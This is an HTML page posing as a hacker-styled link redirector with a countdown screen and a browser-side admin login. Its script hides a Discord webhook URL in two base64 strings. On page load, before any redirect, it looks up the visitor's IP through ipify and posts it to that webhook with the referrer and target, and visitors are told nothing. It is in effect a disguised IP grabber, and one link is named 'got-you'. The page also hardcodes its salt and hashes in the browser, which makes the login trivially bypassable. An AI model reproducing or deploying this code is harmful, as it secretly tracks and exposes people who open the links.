<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uplink Terminal</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --card-bg: #111111;
            --accent: #00ff41;
            --border: #333;
            --text: #e0e0e0;
        }

        body { 
            background-color: var(--bg); 
            color: var(--text); 
            font-family: 'Courier New', Courier, monospace; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }

        .view-container { 
            display: none; 
            width: 100%; 
            max-width: 450px; 
            padding: 20px; 
            flex-direction: column; 
            animation: fadeIn 0.3s ease-out; 
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .brutalist-card { 
            border: 2px solid var(--accent); 
            background-color: var(--card-bg); 
            padding: 2rem; 
            box-shadow: 8px 8px 0px rgba(0, 255, 65, 0.2); 
            box-sizing: border-box; 
            text-align: center;
        }

        .terminal-header { 
            border-bottom: 2px solid var(--accent); 
            margin-bottom: 20px; 
            padding-bottom: 10px; 
            font-weight: bold; 
            letter-spacing: 2px;
            color: var(--accent);
            text-align: left;
        }

        .input-group { margin-bottom: 15px; width: 100%; }

        input { 
            width: 100%; 
            background: #000; 
            border: 1px solid var(--border); 
            color: var(--accent); 
            padding: 12px; 
            box-sizing: border-box; 
            outline: none;
            font-family: 'Courier New', monospace;
        }

        input:focus { border-color: var(--accent); }

        .btn { 
            width: 100%; 
            padding: 15px; 
            background: var(--accent); 
            color: #000; 
            border: none; 
            font-weight: bold; 
            cursor: pointer; 
            text-transform: uppercase;
            transition: 0.2s;
        }

        .btn:hover { background: #00cc33; transform: translate(-2px, -2px); box-shadow: 4px 4px 0 #fff; }

        .countdown-num {
            font-size: 5rem;
            color: var(--accent);
            margin: 20px 0;
            text-shadow: 0 0 15px var(--accent);
        }

        .loader-bar {
            width: 100%;
            height: 4px;
            background: #222;
            position: relative;
            overflow: hidden;
            margin-top: 10px;
        }

        .loader-progress {
            width: 100%;
            height: 100%;
            background: var(--accent);
            position: absolute;
            left: -100%;
            transition: left 5s linear;
        }

        .error-static {
            background: repeating-radial-gradient(#000 0 0.0001%, #222 0 0.0002%) 50% 0/2500px 2500px;
            height: 150px;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid var(--accent);
        }
    </style>
</head>
<body>

    <div id="view-loading" class="view-container">
        <div class="brutalist-card">
            <div class="terminal-header">UPLINK_ESTABLISHED</div>
            <p id="redirect-info" style="font-size: 0.8rem;"></p>
            <div class="countdown-num" id="countdown">5</div>
            <div class="loader-bar"><div class="loader-progress" id="progress-bar"></div></div>
            <p style="font-size: 0.7rem; margin-top: 15px; color: #666;">REDIRECTING INSECURE CONNECTION...</p>
        </div>
    </div>

    <div id="view-login" class="view-container">
        <div class="brutalist-card">
            <div class="terminal-header">ADMIN_LOGIN</div>
            <div class="input-group">
                <input placeholder="OPERATOR_ID" type="text" id="adminUser">
            </div>
            <div class="input-group">
                <input id="adminPass" placeholder="PASSWORD" type="password">
            </div>
            <button class="btn" onclick="attemptLogin()">EXECUTE_LOGIN</button>
        </div>
    </div>

    <div id="view-locked" class="view-container">
        <div class="brutalist-card">
            <div class="terminal-header">ENCRYPTED_LINK</div>
            <p style="font-size: 0.8rem; margin-bottom: 20px;">AUTHORIZATION REQUIRED TO VIEW TARGET</p>
            <div class="input-group">
                <input id="linkPass" placeholder="ACCESS_KEY" type="password">
            </div>
            <button class="btn" onclick="checkLinkPassword()">DECRYPT_UPLINK</button>
        </div>
    </div>

    <div id="view-admin" class="view-container">
        <div class="terminal-header">COMMAND_CENTER</div>
        <div id="admin-list" style="width: 100%;"></div>
        <button class="btn" onclick="location.reload()" style="background: #ff4444;">DISCONNECT</button>
    </div>

    <div id="view-404" class="view-container">
        <div class="brutalist-card">
            <div class="error-static">SIGNAL_LOST</div>
            <h1 style="color: var(--accent);">404 ERROR</h1>
            <button class="btn" onclick="window.location.search=''">REBOOT</button>
        </div>
    </div>

    <script>
        //----------------------------------------------------------------------
        const G_CONFIG = {
            settings: {
                salt: "my_secret_salt_123",
                masterHash: "dc02833e8dba6d393d3f38f678612bbd688aacd85a98afbc95481c352dfefe02",
                hookA: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxMDQ3NTA1NjY4NDk5MDYzNS9KcDFMeFBy", 
                hookB: "ZV9GVHlMUU9fVnFNa0piRGw5cWtxdXRZVC1mYTQ5T1FRLXlzNXdjVkhGbllsSEdrdVB3QTBIZjY1RHpveg=="
            },
            links: {
                'BUa8b2': { url: 'https://imgur.com/a/got-you-45Qpn5g', locked: false },
                'another': { url: 'https://github.com/another-example', locked: false },
                'BingTest': { url: 'https://www.bing.com', locked: true, hash: '578cf32c2d24552cbcf9c680cf9cdd4a077859b9fc6dfc126653d4b6e1ab146e' },
                'Voltsim': { url: 'https://discord.gg/AC8MhtVfF6', locked: false }
            }
        };
        //----------------------------------------------------------------------

        let activeLinkId = null;
        let activeLinkData = null;

        async function getHash(input) {
            const step1 = btoa(input + G_CONFIG.settings.salt);
            const step2 = btoa(step1);
            const msgBuffer = new TextEncoder().encode(step2);
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
            return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
        }

        async function router() {
            const params = new URLSearchParams(window.location.search);
            activeLinkId = params.get('id');
            const ref = params.get('ref') || 'Direct';

            if (activeLinkId) {
                activeLinkData = G_CONFIG.links[activeLinkId];
                if (activeLinkData) {
                    await logHit(activeLinkId, activeLinkData.url, ref);
                    if (activeLinkData.locked) {
                        showView('view-locked');
                    } else {
                        startCountdown(activeLinkData.url);
                    }
                } else {
                    showView('view-404');
                }
            } else {
                showView('view-login');
            }
        }

        async function checkLinkPassword() {
            const p = document.getElementById('linkPass').value;
            const hashed = await getHash(p);
            if (hashed === activeLinkData.hash) {
                startCountdown(activeLinkData.url);
            } else {
                alert("ERR: INVALID_ACCESS_KEY");
                showView('view-404');
            }
        }

        function startCountdown(targetUrl) {
            showView('view-loading');
            document.getElementById('redirect-info').innerText = `TARGET: ${targetUrl.substring(0, 30)}...`;
            
            let count = 5;
            const timerText = document.getElementById('countdown');
            const progress = document.getElementById('progress-bar');
            
            progress.style.left = "0%";

            const interval = setInterval(() => {
                count--;
                timerText.innerText = count;
                if (count <= 0) {
                    clearInterval(interval);
                    window.location.href = targetUrl;
                }
            }, 1000);
        }

        async function logHit(id, url, ref) {
            const hook = atob(G_CONFIG.settings.hookA) + atob(G_CONFIG.settings.hookB);
            let ip = "N/A";
            try { 
                const res = await fetch('https://api.ipify.org?format=json');
                ip = (await res.json()).ip;
            } catch(e) {}
            const payload = {
                embeds: [{
                    title: "ðŸ›°ï¸ CONNECTION DETECTED",
                    color: 65280,
                    fields: [
                        { name: "SHORTCODE", value: `\`#${id}\``, inline: true },
                        { name: "REFERRAL", value: `\`${ref}\``, inline: true },
                        { name: "IP", value: ip },
                        { name: "REDIRECT", value: url }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
        }

        function showView(id) {
            document.querySelectorAll('.view-container').forEach(v => v.style.display = 'none');
            document.getElementById(id).style.display = 'flex';
        }

        async function attemptLogin() {
            const pass = document.getElementById('adminPass').value;
            if (await getHash(pass) === G_CONFIG.settings.masterHash) {
                renderAdmin();
                showView('view-admin');
            } else {
                alert("ERR: AUTH_FAILED");
            }
        }

        function renderAdmin() {
            const list = document.getElementById('admin-list');
            list.innerHTML = '';
            for (const [id, data] of Object.entries(G_CONFIG.links)) {
                const card = document.createElement('div');
                card.className = 'brutalist-card';
                card.style.marginBottom = '15px';
                card.style.textAlign = 'left';
                card.innerHTML = `
                    <div style="color: var(--accent); font-weight: bold;">#${id}</div>
                    <div style="font-size: 0.7rem; color: #888; margin: 10px 0;">${data.url}</div>
                    <button class="btn" style="padding: 8px; font-size: 0.7rem;" onclick="testLink('${id}')">TEST_LINK</button>
                `;
                list.appendChild(card);
            }
        }

        function testLink(id) {
            window.location.search = `?id=${id}&ref=Internal_Admin`;
        }

        window.onload = router;
    </script>
</body>
</html>
